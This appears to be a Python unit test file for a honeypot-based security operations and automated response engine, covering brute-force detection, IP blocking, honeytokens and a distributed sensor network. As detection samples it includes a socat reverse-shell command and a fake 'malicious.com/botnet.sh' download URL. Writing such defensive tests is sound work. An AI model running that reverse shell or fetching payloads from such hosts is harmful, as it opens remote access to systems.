"""
Unit & Integration Tests cho Mini-SOC Active Defense & SOAR Engine
Chạy bằng lệnh: pytest tests/ -v
"""

import os
import sys
import unittest

sys .path .insert (0 ,os .path .abspath (os .path .join (os .path .dirname (__file__ ),"..")))

from core .correlation_engine import EventCorrelationEngine ,CommandNoveltyScorer
from core .distributed_honeynet import DistributedHoneynetCollector ,DistributedSensorNode
from core .honeytoken_manager import HoneytokenManager
from core .soar_enforcer import SOAREnforcer
from core .reverse_intel import ReverseIntelligenceEngine


class TestCorrelationEngine (unittest .TestCase ):
    def setUp (self ):
        self .engine =EventCorrelationEngine (brute_force_threshold =3 ,window_seconds =60 )

    def test_brute_force_detection (self ):
        attacker_ip ="192.168.100.50"
        alerts =[]
        for i in range (4 ):
            event ={
            "eventid":"cowrie.login.failed",
            "src_ip":attacker_ip ,
            "timestamp":f"2026-10-12T12:00:0{i }Z",
            "username":"root",
            "password":f"testpass{i }",
            }
            alert =self .engine .process_event (event )
            if alert :
                alerts .append (alert )

        self .assertGreaterEqual (len (alerts ),1 )
        self .assertEqual (alerts [0 ].mitre_technique_id ,"T1110.001")
        self .assertEqual (alerts [0 ].source_ip ,attacker_ip )
        self .assertIn ("tarpit",alerts [0 ].recommended_action )
        self .assertGreater (alerts [0 ].risk_score ,0 )

    def test_malware_transfer_detection (self ):
        attacker_ip ="192.168.100.99"
        event ={
        "eventid":"cowrie.session.file_download",
        "src_ip":attacker_ip ,
        "timestamp":"2026-10-12T12:05:00Z",
        "url":"http://malicious.com/botnet.sh",
        "shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        }
        alert =self .engine .process_event (event )
        self .assertIsNotNone (alert )
        self .assertEqual (alert .mitre_technique_id ,"T1105")

    def test_command_novelty_scorer (self ):
        scorer =CommandNoveltyScorer ()

        botnet_score =scorer .compute ("uname -a")
        self .assertLess (botnet_score ,0.35 )


        apt_cmd ="socat tcp-connect:10.0.0.1:4444 exec:sh"
        apt_score =scorer .compute (apt_cmd )
        self .assertGreaterEqual (apt_score ,0.60 )


        event ={
        "eventid":"cowrie.command.input",
        "src_ip":"10.0.0.99",
        "timestamp":"2026-11-04T00:00:00Z",
        "input":apt_cmd ,
        "session":"sess-test-apt-01",
        }
        alert =self .engine .process_event (event )
        self .assertIsNotNone (alert )
        self .assertEqual (alert .mitre_technique_id ,"T1059.004")
        self .assertIn ("activate_deep_deception",alert .recommended_action )


class TestSOAREnforcer (unittest .TestCase ):
    def setUp (self ):
        self .enforcer =SOAREnforcer (whitelist =["127.0.0.1","10.0.0.1"])

    def test_whitelist_protection (self ):
        result =self .enforcer .block_ip ("127.0.0.1")
        self .assertEqual (result .get ("status"),"skipped")
        self .assertNotIn ("127.0.0.1",self .enforcer .blocked_ips )

    def test_block_unwhitelisted_ip (self ):
        bad_ip ="198.51.100.25"
        result =self .enforcer .block_ip (bad_ip ,duration_sec =60 )
        self .assertEqual (result .get ("status"),"success")
        self .assertIn (bad_ip ,self .enforcer .blocked_ips )


class TestHoneytokenManager (unittest .TestCase ):
    def setUp (self ):
        self .mgr =HoneytokenManager (callback_base_url ="http://127.0.0.1:8080")

    def test_generate_decoy_files (self ):
        aws_content =self .mgr .create_fake_aws_credentials ()
        self .assertIn ("aws_access_key_id",aws_content )
        self .assertIn ("AKIAIOSFODNN7",aws_content )

        history_content =self .mgr .create_fake_bash_history ()
        self .assertIn ("curl -s",history_content )

        db_content =self .mgr .create_fake_database_backup ()
        self .assertIn ("tbl_admin_users",db_content )

    def test_process_beacon_callback (self ):
        self .mgr .create_fake_aws_credentials ()
        token_id =list (self .mgr .active_tokens .keys ())[0 ]
        alert =self .mgr .process_beacon_callback (
        token_id =token_id ,
        request_headers ={"User-Agent":"Mozilla/5.0 Test"},
        real_ip ="203.0.113.88",
        )
        self .assertEqual (alert ["alert"],"HONEYTOKEN_TRIGGERED")
        self .assertEqual (alert ["attacker_real_ip"],"203.0.113.88")


class TestDistributedHoneynet (unittest .TestCase ):
    def setUp (self ):
        self .received_events =[]
        self .collector =DistributedHoneynetCollector (
        host ="127.0.0.1",
        port =9999 ,
        shared_secret ="secret_test_key",
        event_callback =lambda evt :self .received_events .append (evt ),
        )

    def test_sensor_registration_and_heartbeat (self ):
        res =self .collector .register_or_heartbeat (
        node_id ="sensor-dmz-01",
        subnet ="192.168.10.0/24",
        location ="DMZ Gateway",
        node_type ="SSH_HIGH_INTERACTION",
        )
        self .assertEqual (res ["status"],"acknowledged")
        self .assertIn ("sensor-dmz-01",self .collector .sensors )
        topo =self .collector .get_topology_status ()
        self .assertEqual (len (topo ),1 )
        self .assertEqual (topo [0 ]["node_id"],"sensor-dmz-01")

    def test_event_ingest_and_cross_node_tracking (self ):
        self .collector .register_or_heartbeat ("node-1","10.0.1.0/24","Subnet A","SSH")
        self .collector .register_or_heartbeat ("node-2","10.0.2.0/24","Subnet B","SSH")


        self .collector .ingest_sensor_event ({
        "node_id":"node-1",
        "event":{"eventid":"cowrie.login.failed","src_ip":"198.51.100.77"},
        })
        self .assertEqual (len (self .received_events ),1 )
        self .assertEqual (self .received_events [0 ]["targeted_nodes_count"],1 )


        self .collector .ingest_sensor_event ({
        "node_id":"node-2",
        "event":{"eventid":"cowrie.login.failed","src_ip":"198.51.100.77"},
        })
        self .assertEqual (len (self .received_events ),2 )
        self .assertEqual (self .received_events [1 ]["targeted_nodes_count"],2 )


if __name__ =="__main__":
    unittest .main ()
